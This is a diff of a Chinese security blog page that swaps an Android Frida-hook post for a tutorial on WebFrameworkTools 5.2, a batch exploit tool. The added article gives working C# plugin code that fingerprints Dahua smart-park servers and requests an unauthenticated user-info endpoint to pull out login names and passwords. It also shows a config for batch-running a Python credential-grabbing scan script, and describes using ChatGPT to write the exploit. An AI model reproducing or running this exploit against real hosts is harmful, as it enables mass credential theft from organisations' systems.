@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="直播app 获取rtmp播放地址-腾讯播放器Frida-hook, peiqiF4ck github">
-    <meta name="description" content="获取rtmp播放地址-腾讯播放器Frida-hook">
+    <meta name="keywords" content="综合性exp|poc渗透工具-WebFrameworkTools5.2 新版用法exp poc编写教学, peiqiF4ck github">
+    <meta name="description" content="exp|poc渗透工具">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>直播app 获取rtmp播放地址-腾讯播放器Frida-hook | peiqiF4ck</title>
+    <title>综合性exp|poc渗透工具-WebFrameworkTools5.2 新版用法exp poc编写教学 | peiqiF4ck</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -265,7 +265,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '755aedd9ad1a1ba6d6bc030afc19744a0ce09cce0febf1768d69e1ba045dd330';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -278,12 +278,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101607961.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021444462.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">直播app 获取rtmp播放地址-腾讯播放器Frida-hook</h1>
+                    <h1 class="description center-align post-title">综合性exp|poc渗透工具-WebFrameworkTools5.2 新版用法exp poc编写教学</h1>
                 </div>
             </div>
         </div>
@@ -399,16 +399,12 @@
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/PenetrationTest/">
+                                <span class="chip bg-color">PenetrationTest</span>
+                            </a>
+                        
                             <a href="/tags/original/">
                                 <span class="chip bg-color">original</span>
-                            </a>
-                        
-                            <a href="/tags/Frida/">
-                                <span class="chip bg-color">Frida</span>
-                            </a>
-                        
-                            <a href="/tags/Vip/">
-                                <span class="chip bg-color">Vip</span>
                             </a>
                         
                     </div>
@@ -419,8 +415,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/AndroidReverse/" class="post-category">
-                                AndroidReverse
+                            <a href="/categories/SecurityTools/" class="post-category">
+                                SecurityTools
                             </a>
                         
                     </div>
@@ -432,28 +428,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-01-10
+                    2023-09-02
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-02-18
+                    2023-09-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    51
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -476,16 +472,173 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="分析app"><a href="#分析app" class="headerlink" title="分析app"></a>分析app</h1><ul>
-<li>把app放到jadx 里面找到包名如下图<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101543624.png"></li>
-<li>找到图片里面的方法<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101544176.png"></li>
-<li>Hook图片里面的方法<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101545128.png"></li>
-</ul>
-<h2 id="hook代码"><a href="#hook代码" class="headerlink" title="hook代码"></a>hook代码</h2>   <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">FoVplMzAwMTQ5NTI3ZTcyZTE0NzQ1YjUxMTUzZTgyNGE0ZmQ1Zjk0Yjg3Zjk4YjRmZWZmNTBhOGU4NGY0Y2YzMjk0OGRmNGM0NTM5MzA5ZWMwODlhYjExZDdiNWQ5MDhhZjNhMzg5NTJiNzJlOTRiNWM1YTEwYmY0Mzc4ZDJkMzcyYTQ0MjUzZjdlNjI1MDQ0Y2RjMTFlNjFmOTU1NGI3MTRkNWRiYzIwMzk0MGJhNGE4ZTNmYzZkYWU2ZTJmM2M3MThmOGU5ZWViZTRkNjNlZDMwZjJmZjRiYzViMzE3MmI1ZDE3NzI5ZTkyNmQ5NmUyYWYxMDFjZDhjOGQ3NDExNTQ4MWUxOTI1ZjA5YTVkODk2NzNhNDcwY2U3MjRjNTNkYzk1ZGUyMDFkNzNlNDAyODhmMTVmYmNkODM2YWM2Y2MyYWNiNGM4ZWFjNmFkYzM1NjA3ZWRlMmM0NmZmYzlkM2EwMDY2ZGExMTU4MTE4MTFhYTNmZjFlYTZkYzAxNTg4NTJhMjE4NTNiN2RlZjcyYjRkZmJjMzZlYjliMDk5NmYwZWM3YWIyOTU1M2Q0YTQzNWEwYWQxMTg1MTQ0NmVlOTBiNTgxYzYzNjExY2IxZjZhYTg2MWMxZDcxNzBkYjQ4NWQ1ZjI5ZmMyOWNlNjAwZWM4YTJjZjliZDk2NDUxM2I2YmVhNzhjMzk1MmEwY2UwN2ZiZmMyZmE0YmQyYzAzNmM0YmViMDgzMTBiYjU0NTJmMzM5NTE2NWY4Y2QxYjdmMWYyMmE3NzFlN2U1MWNmNzA1NzYxOTgyOTM5N2ZkNDYwODQ0MzNjMzYyMDlhODAyMGFlOGMxYTc0NDhmNzUzNGRlNGNiZjE5ZWM0ZDRiYTdmMTY0YzkyN2RlMWI0NTJjZjJmZDZkNjViMTg0NDdmY2I5NzBlNDAyYTdiZmU4NmMzMDdhYmM2OWU4ZGMzNmNkYzY4YjEwNmZlMjljMmJlMTlkNGFlZGRmN2QxNDcyNzEyZDhmMmM4Yjk1YjZlZTIzZDU4ZjdhYjhkODhhNDA4OTRlOWUwODU0MDM3ZTMxYzk2ZjlhNmE4Y2M5MzMwNDQ3M2RjOWY3NTZlNTU0OGZmZTU1MDQ4YjA5YzVkOWFkYzBiMDhiODRkMWQ1NDM2MzcwMmUxYmQzMDY2ZTMxZTQwYmJjNDMxYjVmMWY0YzhlYTkzNmQ0OTE0MmJkNDQ4ZDRkYzdlNjZhZDFiYjIwMDE4ZGIzY2YyMzUxMTgzOWM1Zjc0MmZhZGY0NDMyYzllZjRjOWU2Py
-   </code></pre>
-<ul>
-<li>效果(当然得有一定的frida使用基础)<br>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101549477.png"></li>
-</ul>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此前我们发布了2022-08-26 版本这个应该算是5.0的产品。5.2和它的不同点我在这里 <a target="_blank" rel="noopener" href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a> 已经发布。5.2最大的不同点就是可以调用任意程序批量执行下面我重点讲解一下5.1 图形化生成exp还有插件编写和5.2新版功能。至于用法参考17280a163317a771 这篇和github接下来废话不多说我们来介绍一下。我们以这里的漏洞<a target="_blank" rel="noopener" href="https://github.com/MzzdToT/HAC_Bored_Writing">https://github.com/MzzdToT/HAC_Bored_Writing</a> 举例子实战测试。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021238636.png" alt="2022-08-26"></p>
+<h2 id="图形化生成exp"><a href="#图形化生成exp" class="headerlink" title="图形化生成exp"></a>图形化生成exp</h2><p>我们根据提示搜索到如下exp我们直接copy到我们本地运行<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021247731.png" alt="这个漏洞为力"><br>copy出的exp运行测试没有报错<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021253414.png" alt="exp截图"><br>随便找个网站测试出现下面的图说明存在漏洞<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021257274.png" alt="存在漏洞"><br>分析一下这个python写的脚本我们来构造exp。下面的代码是get请求访问url+&#x2F;admin&#x2F;user_getUserInfoByUserName.action?userName&#x3D;system 得到的结果使用正则表达式提取结果我们来看一波。这个需要你们会python才能看懂如果看不懂可以去chatgpt问一下代码的意思。这里就不多说了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021259758.png" alt="核心exp"><br>首先访问目标网站确定可以访问。然后我们加上exp看看返回<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021301334.png" alt="目标可以访问"><br>我们看到了返回结果nice。接下来我们怎么构造exp。我一步一步来。<br>第一步:exp访问目标网站<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021304424.png" alt="第一步"><br>第二步:填写目标特征(这个可有可无)有的话就是精确打击效果显著。我们先找个漏洞网站的链接访问得到指纹和特征如下图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021308561.png" alt="得到指纹"><br>接下来我们来图形化exp构造一下。构造指纹以后在访问一波<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021312867.png" alt="指纹没问题"><br>第三步:提取exp。填上包含这个字符串就没问题。但是结果太长了。我们使用正则看看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021314799.png" alt="结果"><br>最终结果就是这个。软件运行得到的结果也是这个。我们来生成一下exp。插件名称dahuapass<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021318134.png" alt="得到最终结果"><br>生成利用程序<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021319849.png" alt="生成利用程序"><br>第四步:测试结果。把这个两个dll拷贝如下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021321393.png" alt="dll拷贝"><br>第五步:进去dll模式测试插件。可以看到生成的结果和我们图形化构造的结果一样。ok已经完成。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021324887.png" alt="生成的结果一样"></p>
+<h2 id="exp插件编写"><a href="#exp插件编写" class="headerlink" title="exp插件编写"></a>exp插件编写</h2><p>这个需要会变点编程功底我们去github下载我们的插件项目。<br><a target="_blank" rel="noopener" href="https://github.com/peiqiF4ck/ToolsUserDllplugin">https://github.com/peiqiF4ck/ToolsUserDllplugin</a>  使用vs2022打开项目。有人说这玩意我不太会写代码你找chatgpt我将演示一下如何帮助我们写出exp。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021330897.png" alt="下载下来打开项目"><br>第一步:解决写出请求方式让chatgpt 。话术。让他封装成函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021332436.png" alt="gpt"><br>让他用.netframework方式给我们写<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021334148.png" alt="写出来"><br>代码</p>
+<pre class="language-C#" data-language="C#"><code class="language-C#">public static void Main(string[] args)
+    &#123;
+        string url &#x3D; &quot;https:&#x2F;&#x2F;example.com&quot;; &#x2F;&#x2F; 替换为你要请求的URL
+        string result &#x3D; GetResponse(url, TimeSpan.FromSeconds(30));
+        Console.WriteLine(result);
+    &#125;
+
+    public static string GetResponse(string url, TimeSpan timeout)
+    &#123;
+        string responseText &#x3D; string.Empty;
+
+        try
+        &#123;
+            HttpWebRequest request &#x3D; (HttpWebRequest)WebRequest.Create(url);
+            request.Timeout &#x3D; (int)timeout.TotalMilliseconds;
+
+            using (HttpWebResponse response &#x3D; (HttpWebResponse)request.GetResponse())
+            &#123;
+                using (Stream stream &#x3D; response.GetResponseStream())
+                &#123;
+                    using (StreamReader reader &#x3D; new StreamReader(stream))
+                    &#123;
+                        responseText &#x3D; reader.ReadToEnd();
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+        catch (Exception ex)
+        &#123;
+            responseText &#x3D; $&quot;请求出错: &#123;ex.Message&#125;&quot;;
+        &#125;
+
+        return responseText;
+    &#125;
+</code></pre>
+<p>然后我们直接copy代码到项目里面。发现报错这是因为没有添加依赖。using System.IO;<br>using System.Net;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021337153.png"><br>添加依赖错误消失<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021338870.png"><br>修改我们的的函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021341860.png"><br>调用我们的函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021342684.png"><br>我们从前面知道要想结果准确需要搞一个指纹所以下面格式就是我写的。然后含有loginname的才有漏洞所以我们知道结果是。{“id”:1,”extId”:1,”loginName”:”ooo”,”loginPass”:”xxx”,”“} 让chatgpt帮我们提取里面的<br>ooo和xxx<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021348613.png"></p>
+<p>看操作:我有一个字符串 {“id”:1,”extId”:1,”loginName”:”ooo”,”loginPass”:”xxx”,”“}  帮我写一个正则表达式提取下一结果得到的结果是 ooo:xxx 。直接copy<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021352256.png" alt="直接拿捏"><br>copy报错同样是导入依赖。把那个未能提取结果改成 error。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021353641.png"></p>
+<pre class="language-C#" data-language="C#"><code class="language-C#">
+public static string ExtractResult(string input)
+      &#123;
+          string pattern &#x3D; &quot;\&quot;loginName\&quot;:\&quot;([^\&quot;]+)\&quot;,\&quot;loginPass\&quot;:\&quot;([^\&quot;]+)\&quot;&quot;;
+          Match match &#x3D; Regex.Match(input, pattern);
+
+          if (match.Success)
+          &#123;
+              string loginName &#x3D; match.Groups[1].Value;
+              string loginPass &#x3D; match.Groups[2].Value;
+
+              return $&quot;&#123;loginName&#125;:&#123;loginPass&#125;&quot;;
+          &#125;
+          else
+          &#123;
+              return &quot;error&quot;;
+          &#125;
+      &#125;</code></pre>
+<p>我们接下来看操作 直接调用</p>
+<pre class="language-C#" data-language="C#"><code class="language-C#">&#x2F;&#x2F;&#x2F; &lt;summary&gt;
+     &#x2F;&#x2F;&#x2F; http漏洞代码实现  
+     &#x2F;&#x2F;&#x2F; down 表示网站无法访问
+     &#x2F;&#x2F;&#x2F; error 表示没有漏洞 返回error
+     &#x2F;&#x2F;&#x2F; 成功则返回结果
+     &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;
+     &#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;url&quot;&gt;&lt;&#x2F;param&gt;
+     &#x2F;&#x2F;&#x2F; &lt;returns&gt;&lt;&#x2F;returns&gt;
+     private  static string thinkphpRce(string url)
+     &#123;
+         string result &#x3D; string.Empty;
+
+         &#x2F;&#x2F;&#x2F;调用httpSendMethod 实战漏洞逻辑
+         &#x2F;&#x2F;&#x2F;
+         string errorcase &#x3D; &quot;error&quot;;
+
+         string expUrl &#x3D; url + &quot;&#x2F;admin&#x2F;user_getUserInfoByUserName.action?userName&#x3D;system&quot;;
+         string fingerUrl &#x3D; url + &quot;&#x2F;WPMS&#x2F;asset&#x2F;css&#x2F;login.css&quot;;
+
+         string res &#x3D; httpSendMethodMy(fingerUrl, 30*1000); &#x2F;&#x2F;调用http请求请求结果
+
+         if (!res.Contains(&quot;login-brand&quot;)) &#x2F;&#x2F;指纹请求
+         &#123;
+             Console.WriteLine(&quot;No 大华智慧 product&quot;);
+             return errorcase;
+         &#125;
+
+         string res1 &#x3D; httpSendMethodMy(expUrl, 30 * 1000); &#x2F;&#x2F;调用http请求请求结果
+
+         if (res1.Contains(&quot;loginName&quot;)) &#x2F;&#x2F;
+         &#123;
+             &#x2F;&#x2F;通过正则表达式方式直接刷选出漏洞然后赋值结果
+
+
+             string userpass &#x3D; ExtractResult(res1);
+
+             if (errorcase.Equals(userpass))
+             &#123;
+                 Console.WriteLine(&quot;正则提取失败&quot;);
+                 return errorcase;
+             &#125;
+             &#x2F;&#x2F;Console.WriteLine(userpass);
+
+             result &#x3D; url + &quot;|&quot; + userpass+ &quot;|ExpName:大华漏洞&quot;;  &#x2F;&#x2F;这里 |ExpName: 是必须标注的 重点重点！！！！
+
+
+         &#125;
+         else
+         &#123;
+
+
+             result &#x3D; errorcase;
+         &#125;
+
+
+
+         return result;
+     &#125;</code></pre>
+
+<pre class="language-C#" data-language="C#"><code class="language-C#">public static string DllExec(string url)
+      &#123; &#x2F;&#x2F;方法名称
+
+          string expResult &#x3D; string.Empty;
+          string errorcase &#x3D; &quot;error&quot;;
+
+
+          string thinkphpRceRes &#x3D; thinkphpRce(url); &#x2F;&#x2F;调用函数
+
+       
+
+          if (errorcase.Equals(thinkphpRceRes))
+          &#123;
+
+              expResult &#x3D; errorcase;
+
+          &#125;
+          else
+          &#123;
+           
+              expResult &#x3D; thinkphpRceRes; &#x2F;&#x2F;系统系统写结果
+              &#x2F;&#x2F;  Console.WriteLine(expResult);
+             &#x2F;&#x2F; expResult &#x3D; thinkphpRceRes + &quot;|5a75574b96ce583b250cdcfff48caa78|&quot;; &#x2F;&#x2F;用户自己写成功结果系统不管 标志5a75574b96ce583b250cdcfff48caa78 加上这个标志就是你自己写你自己的结果。就行了
+
+          &#125;
+
+          return expResult;
+      &#125;
+</code></pre>
+
+<p>然后生成dll我们开始测试。生成dll名字放到软件同目录下。dll名字可以修改<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021425234.png"><br>测试结果没毛病。这个案例编写我会放到频道。请到频道下载。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021425178.png"></p>
+<h2 id="5-2新功能-此功能属于最新开发"><a href="#5-2新功能-此功能属于最新开发" class="headerlink" title="5.2新功能(此功能属于最新开发)"></a>5.2新功能(此功能属于最新开发)</h2><p>看了上面的两种。第一种适合简单的请求。第二种可以 编写任意exp 但是要求使用者会点编程配合chatgpt的使用。前两种功能都有第三种最新开发还没有放出。这里介绍一下使用方法。<br>接下来我们看第三种来演示一下。之前我们说过得到一个脚本运行一波。那个网站有漏洞。格式<br>python Dahua_getpass_scan.py -u website<br>配置文件。格式必须是这种的</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token class-name">WebTools</span><span class="token punctuation">]</span>
+#这里可以在cmd里面执行无需配置绝对路径否则需配置绝对路径
+exe<span class="token operator">=</span>python
+#这里是执行脚本的参数
+arg<span class="token operator">=</span>python\<span class="token class-name">Dahua_getpass_scan</span><span class="token punctuation">.</span>py <span class="token operator">-</span>u $url$
+#漏洞特征字符串包含这个字符串就有漏洞
+vulStr<span class="token operator">=</span>is vulnerable
+#正则表达式提取字符串
+regex<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;=</span>\<span class="token punctuation">[</span>\<span class="token operator">+</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>*
+#配置不输出程序执行的所有结果只输出正则结果等
+echoAllResult<span class="token operator">=</span>no
+#配置是否需要本程序写入结果
+writeFile<span class="token operator">=</span>yes
+#配置不包含这个字符串有漏洞注意vulStr和<span class="token class-name">NovulStr</span>不能同时出现在同一个配置文件中
+#<span class="token class-name">NovulStr</span></code></pre>
+<p>我们测试一下看看。这个直接可以漏洞脚本和ini文件可以分别放置只需要配置就行了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021441108.png" alt="5.2测试截图"><br>批量工具测试<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021444462.png"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>各种用法和软件公布时间见github。案例源代码:<a target="_blank" rel="noopener" href="https://t.me/SoftwareNoticeChannel/265">https://t.me/SoftwareNoticeChannel/265</a></p>
 
                 
             </div>
@@ -512,7 +665,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://peiqiF4ck.github.io/androidreverse/2023/01/articles/b9d040d0979b56be/">https://peiqiF4ck.github.io/androidreverse/2023/01/articles/b9d040d0979b56be/</a>
+                    <a href="https://peiqiF4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/">https://peiqiF4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -550,16 +703,12 @@
                     
                         <div class="article-tag">
                             
+                                <a href="/tags/PenetrationTest/">
+                                    <span class="chip bg-color">PenetrationTest</span>
+                                </a>
+                            
                                 <a href="/tags/original/">
                                     <span class="chip bg-color">original</span>
-                                </a>
-                            
-                                <a href="/tags/Frida/">
-                                    <span class="chip bg-color">Frida</span>
-                                </a>
-                            
-                                <a href="/tags/Vip/">
-                                    <span class="chip bg-color">Vip</span>
                                 </a>
                             
                         </div>
@@ -733,49 +882,51 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/0day/2023/02/articles/51b7e07325d69b2b/">
+                <a href="/securitytools/2023/09/articles/2633a9b907f3f584/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061659904.png" class="responsive-img" alt="北京勤云期刊0day漏洞-可shell">
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021444462.png" class="responsive-img" alt="综合性exp|poc渗透工具-WebFrameworkTools5.2 新版用法exp poc编写教学">
                         
-                        <span class="card-title">北京勤云期刊0day漏洞-可shell</span>
+                        <span class="card-title">综合性exp|poc渗透工具-WebFrameworkTools5.2 新版用法exp poc编写教学</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            北京勤云期刊0day漏洞,期刊类漏洞
+                            exp|poc渗透工具
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/0day/" class="post-category">
-                                    0day
+                            <a href="/categories/SecurityTools/" class="post-category">
+                                    SecurityTools
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/original/">
-                        <span class="chip bg-color">original</span>
+                    <a href="/tags/PenetrationTest/">
+                        <span class="chip bg-color">PenetrationTest</span>
                     </a>
                     
-                    <a href="/tags/0day/">
-                        <span class="chip bg-color">0day</span>
+                    <a href="/tags/original/">
+                        <span class="chip bg-color">original</span>
                     </a>
                     
                 </div>
@@ -789,30 +940,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/androidreverse/2023/01/articles/a94394783b10c35a/">
+                <a href="/codeaudit/2023/09/articles/2d6e04e436b4b308/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261952214.png" class="responsive-img" alt="FriDa安装">
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011915972.png" class="responsive-img" alt="亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞poc解析">
                         
-                        <span class="card-title">FriDa安装</span>
+                        <span class="card-title">亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞poc解析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Frida入门,Frida安装
+                            亿赛通poc解析,hw漏洞更新
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/AndroidReverse/" class="post-category">
-                                    AndroidReverse
+                            <a href="/categories/CodeAudit/" class="post-category">
+                                    CodeAudit
                                 </a>
                             
                             
@@ -822,8 +973,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Frida/">
-                        <span class="chip bg-color">Frida</span>
+                    <a href="/tags/CodeAuditExample/">
+                        <span class="chip bg-color">CodeAuditExample</span>
                     </a>
                     
                 </div>
